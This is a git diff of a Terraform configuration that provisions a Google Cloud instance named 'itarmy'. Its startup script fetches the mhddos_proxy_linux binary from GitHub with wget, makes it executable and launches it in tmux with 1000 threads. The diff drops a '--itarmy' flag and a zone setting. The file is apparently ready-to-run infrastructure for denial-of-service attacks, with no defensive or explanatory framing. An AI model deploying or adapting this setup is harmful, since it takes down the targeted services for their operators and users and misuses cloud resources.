@@ -1,5 +1,4 @@
 provider "google" {
-  zone = "europe-west3-c"
 }
 
 data "google_billing_account" "itarmy" {
@@ -68,7 +67,7 @@ resource "google_compute_instance" "itarmy" {
       mkdir -p ~/bin
       wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -O ~/bin/mhddos_proxy_linux && chmod 755 ~/bin/mhddos_proxy_linux
       tmux new -ds itarmy
-      tmux send 'mhddos_proxy_linux --itarmy -t 1000' Enter
+      tmux send 'mhddos_proxy_linux -t 1000' Enter
       echo -e '"\\e[A": history-search-backward\n"\\e[B": history-search-forward' > ~/.inputrc
       EOF
     EOT
